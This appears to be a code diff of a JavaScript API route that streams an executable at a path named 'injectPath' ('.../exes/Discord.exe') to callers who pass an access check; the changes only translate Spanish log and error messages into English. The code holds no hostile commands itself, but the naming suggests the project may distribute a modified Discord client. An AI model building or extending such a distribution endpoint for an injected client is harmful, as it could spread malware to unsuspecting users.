@@ -3,7 +3,7 @@ import fs from 'fs';
 import { pipeline } from 'stream';
 
 const injectPath = 'src/files/scripts/raws/exes/Discord.exe';
-const CHUNK_SIZE = 1024 * 1024; // Tamaño del fragmento, por ejemplo, 1 MB
+const CHUNK_SIZE = 1024 * 1024; 
 export const config = {
   api: {
     responseLimit: false,
@@ -26,20 +26,20 @@ export default async function handler(req, res) {
 
         pipeline(fileStream, res, (err) => {
           if (err) {
-            console.error('Error en la transmisión del archivo:', err);
+            console.error('File transmission error:', err);
             res.status(500).end();
           } else {
-            console.log('Descarga exitosa');
+            console.log('Successful download');
           }
         });
       } else {
-        res.status(404).json({ error: 'Archivo no encontrado.' });
+        res.status(404).json({ error: 'File not found.' });
       }
     } else {
-      res.status(403).json({ error: 'Acceso denegado.' });
+      res.status(403).json({ error: 'Access denied.' });
     }
   } catch (error) {
-    console.error('Error en el servidor:', error);
-    res.status(500).json({ error: 'Error interno del servidor.' });
+    console.error('Internal Server Error:', error);
+    res.status(500).json({ error: 'Internal Server Error.' });
   }
 }
